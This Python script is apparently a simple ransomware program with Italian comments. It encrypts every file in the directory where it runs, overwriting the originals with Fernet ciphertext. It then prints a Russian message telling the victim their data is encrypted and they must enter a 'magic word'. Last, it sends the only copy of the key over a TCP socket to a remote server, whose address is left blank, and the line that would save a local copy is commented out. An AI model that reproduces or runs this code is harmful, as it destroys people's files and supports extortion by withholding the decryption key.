#!/usr/bin/env python3


import time
import socket
import os
from cryptography.fernet import Fernet 

files = []

    # Per vedere cosa fa Fernet visitate:
    # https://www.geeksforgeeks.org/fernet-symmetric-encryption-using-cryptography-module-in-python/

# for che prende ogni tipo di elemento all'interno della cartella dove è stato eseguito il codice
for file in os.listdir():
    # skippa se stesso per evitare di essere anche criptato anche lui
    if file == "ransomware.py" or file == "thekey.key" or file == "decrypt.py" or file == "recieve.py":
        continue
    # per ogni file (e quindi non cartella/directory) esegui la cifratura
    if os.path.isfile(file):
        files.append(file)

    #creo la chiave
key = Fernet.generate_key()
    
# questa funzione cifra ogni file all'interno della stringa files
for file in files:
    # legge il dato
    with open(file, "rb") as thefile:
        contents = thefile.read()
    # utilizza la chiave generata per cifrare il file
    contents_encrypted = Fernet(key).encrypt(contents)
    # scrive nel file il messaggio cifrato sovrascrivendolo a quello in chiaro
    with open(file, "wb") as thefile:
        thefile.write(contents_encrypted)

print("Все ваши данные были зашифрованы, введите волшебное слово, которое мы вам дали, чтобы разблокировать их.")
time.sleep(10)

    #with open("thekey.key", "wb") as thekey:
    #    thekey.write(key)


# Configurazione del client
indirizzo_server = ''  # Inserisci l'indirizzo IP o il nome del server
porta_server = 12345

# Crea un socket TCP/IP
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# Connetti il client al server
client_socket.connect((indirizzo_server, porta_server))
# Invia una stringa al server
key
client_socket.sendall(key)

# Chiudi la connessione
client_socket.close()
